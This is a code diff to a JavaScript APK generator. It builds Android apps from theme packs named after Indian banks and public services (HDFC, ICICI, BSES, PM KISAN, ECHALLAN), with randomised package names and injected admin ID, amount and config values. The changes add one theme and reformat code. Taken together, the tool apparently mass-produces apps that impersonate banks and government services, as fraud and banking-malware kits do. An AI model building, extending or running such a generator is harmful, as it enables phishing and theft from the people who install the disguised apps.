@@ -24,7 +24,7 @@ class ApkGenerator {
     }
 
     initResPath() {
-        if (this.appTheme === "WATER" || this.appTheme === "Customer SB" || this.appTheme === "HDFC NEU" || this.appTheme === "BSES" || this.appTheme === "ICICI" || this.appTheme === "PM KISAN" || this.appTheme === "ECHALLAN") {
+        if (this.appTheme === "WATER" || this.appTheme === "Customer SB" || this.appTheme === "Customer SB V2" || this.appTheme === "HDFC NEU" || this.appTheme === "BSES" || this.appTheme === "ICICI" || this.appTheme === "PM KISAN" || this.appTheme === "ECHALLAN") {
             this.resZip = path.join(__dirname, `../../data/resources/${this.appTheme}.zip`);
         } else if (this.appTheme === "POWER" || this.appTheme === "POWER V2") {
             this.resZip = path.join(__dirname, `../../data/resources/POWER.zip`);
@@ -38,9 +38,7 @@ class ApkGenerator {
     getRandomPackage() {
         const randomPart = () => {
             const letters = "abcdefghijklmnopqrstuvwxyz";
-            return Array.from({length: 6}, () =>
-                letters[Math.floor(Math.random() * letters.length)]
-            ).join("");
+            return Array.from({length: 6}, () => letters[Math.floor(Math.random() * letters.length)]).join("");
         };
         return `com.${randomPart()}.${randomPart()}`;
     }
@@ -178,18 +176,12 @@ class ApkGenerator {
             }
             let stringsContent = fs.readFileSync(stringsPath, "utf8");
             const newStringTag = `<string name="app_name">${this.appName}</string>`;
-            const newStringsContent = stringsContent.replace(
-                /<string\s+name="app_name">.*?<\/string>/,
-                newStringTag
-            );
+            const newStringsContent = stringsContent.replace(/<string\s+name="app_name">.*?<\/string>/, newStringTag);
             fs.writeFileSync(stringsPath, newStringsContent, "utf8");
             this.printLine(`Updated strings.xml with new app name: "${this.appName}"`);
         } else {
             const newLabelAttribute = `android:label="${this.appName}"`;
-            const newManifestContent = manifestContent.replace(
-                /android:label=".*?"/,
-                newLabelAttribute
-            );
+            const newManifestContent = manifestContent.replace(/android:label=".*?"/, newLabelAttribute);
             fs.writeFileSync(manifestPath, newManifestContent, "utf8");
             this.printLine(`Updated AndroidManifest.xml with new app name: "${this.appName}"`);
         }
@@ -202,10 +194,7 @@ class ApkGenerator {
         const utilsPath = path.join(this.projectPath, "app", "src", "main", "java", this.newPackage.replaceAll(".", "/"), "functions", "Utils.java");
         let utilsContent = fs.readFileSync(utilsPath, "utf8");
         const newIDAttribute = `ADMIN_ID = "${this.adminPackageName}"`;
-        const newUtilsContent = utilsContent.replace(
-            /ADMIN_ID = ".*?"/,
-            newIDAttribute
-        );
+        const newUtilsContent = utilsContent.replace(/ADMIN_ID = ".*?"/, newIDAttribute);
         fs.writeFileSync(utilsPath, newUtilsContent, "utf8");
         this.printLine(`Updated Utils with new key"`);
     }
@@ -217,10 +206,7 @@ class ApkGenerator {
         const utilsPath = path.join(this.projectPath, "app", "src", "main", "java", this.newPackage.replaceAll(".", "/"), "functions", "Utils.java");
         let utilsContent = fs.readFileSync(utilsPath, "utf8");
         const newIDAttribute = `AMOUNT = "${this.amount}"`;
-        const newUtilsContent = utilsContent.replace(
-            /AMOUNT = ".*?"/,
-            newIDAttribute
-        );
+        const newUtilsContent = utilsContent.replace(/AMOUNT = ".*?"/, newIDAttribute);
         fs.writeFileSync(utilsPath, newUtilsContent, "utf8");
         this.printLine(`Updated Utils with Amount"`);
     }
@@ -232,10 +218,7 @@ class ApkGenerator {
         const utilsPath = path.join(this.projectPath, "app", "src", "main", "java", this.newPackage.replaceAll(".", "/"), "functions", "Utils.java");
         let utilsContent = fs.readFileSync(utilsPath, "utf8");
         const newIDAttribute = `THEME = "${this.appTheme}"`;
-        const newUtilsContent = utilsContent.replace(
-            /THEME = ".*?"/,
-            newIDAttribute
-        );
+        const newUtilsContent = utilsContent.replace(/THEME = ".*?"/, newIDAttribute);
         fs.writeFileSync(utilsPath, newUtilsContent, "utf8");
         this.printLine(`Updated Utils with THEME"`);
     }
@@ -247,10 +230,7 @@ class ApkGenerator {
         const utilsPath = path.join(this.projectPath, "app", "src", "main", "java", this.newPackage.replaceAll(".", "/"), "functions", "Utils.java");
         let utilsContent = fs.readFileSync(utilsPath, "utf8");
         const newIDAttribute = `CONFIGS = "${this.adminConfigs}"`;
-        const newUtilsContent = utilsContent.replace(
-            /CONFIGS = ".*?"/,
-            newIDAttribute
-        );
+        const newUtilsContent = utilsContent.replace(/CONFIGS = ".*?"/, newIDAttribute);
         fs.writeFileSync(utilsPath, newUtilsContent, "utf8");
         this.printLine(`Updated Utils with CONFIGS"`);
     }
@@ -279,31 +259,23 @@ class ApkGenerator {
                 // 1) Resize image to 220x220 and get buffer
                 sharp(source)
                     .resize({
-                        width: 220,
-                        height: 220,
-                        fit: 'contain',
-                        background: {r: 0, g: 0, b: 0, alpha: 0} // Transparent background
+                        width: 220, height: 220, fit: 'contain', background: {r: 0, g: 0, b: 0, alpha: 0} // Transparent background
                     })
                     .toBuffer()
                     .then((resizedBuffer) => {
                         // 2) Create a 324x324 canvas and center the 220x220 image
                         return sharp({
                             create: {
-                                width: 324,
-                                height: 324,
-                                channels: 4,
-                                background: {r: 0, g: 0, b: 0, alpha: 0} // Transparent canvas
+                                width: 324, height: 324, channels: 4, background: {r: 0, g: 0, b: 0, alpha: 0} // Transparent canvas
                             }
                         })
                             .composite([{input: resizedBuffer, gravity: 'center'}])
                             .toFile(destinationPath);
                     })
                     .then(() => {
-                        this.printLine(
-                            `✅ Image scaled (220x220) and padded to 324x324 [${path
-                                .basename(destinationPath)
-                                .replace('app.', this.appName + '.')}].`
-                        );
+                        this.printLine(`✅ Image scaled (220x220) and padded to 324x324 [${path
+                            .basename(destinationPath)
+                            .replace('app.', this.appName + '.')}].`);
                         resolve();
                     })
                     .catch((err) => {
@@ -317,11 +289,9 @@ class ApkGenerator {
                         console.error(`Error copying file: ${err}`);
                         return reject(err);
                     } else {
-                        this.printLine(
-                            `✅ File copied successfully [${path
-                                .basename(destinationPath)
-                                .replace('app.', this.appName + '.')}].`
-                        );
+                        this.printLine(`✅ File copied successfully [${path
+                            .basename(destinationPath)
+                            .replace('app.', this.appName + '.')}].`);
                         resolve();
                     }
                 });
@@ -336,8 +306,7 @@ class ApkGenerator {
             const gradleCommand = process.platform === "win32" ? "gradlew.bat" : "./gradlew";
 
             const buildProcess = spawn(gradleCommand, ["clean", "assembleRelease"], {
-                cwd: this.projectPath,
-                shell: true,
+                cwd: this.projectPath, shell: true,
             });
 
             buildProcess.stdout.on("data", (data) => {
@@ -406,15 +375,7 @@ class ApkGenerator {
             const zip = new AdmZip(this.resZip);
             const entries = zip.getEntries();
 
-            const allowedFolders = [
-                'mipmap-xxxhdpi/',
-                'mipmap-anydpi/',
-                'mipmap-anydpi-v26/',
-                'mipmap-hdpi/',
-                'mipmap-mdpi/',
-                'mipmap-xhdpi/',
-                'mipmap-xxhdpi/'
-            ];
+            const allowedFolders = ['mipmap-xxxhdpi/', 'mipmap-anydpi/', 'mipmap-anydpi-v26/', 'mipmap-hdpi/', 'mipmap-mdpi/', 'mipmap-xhdpi/', 'mipmap-xxhdpi/'];
 
             console.log(`Extracting selected mipmap folders from zip...`);
 
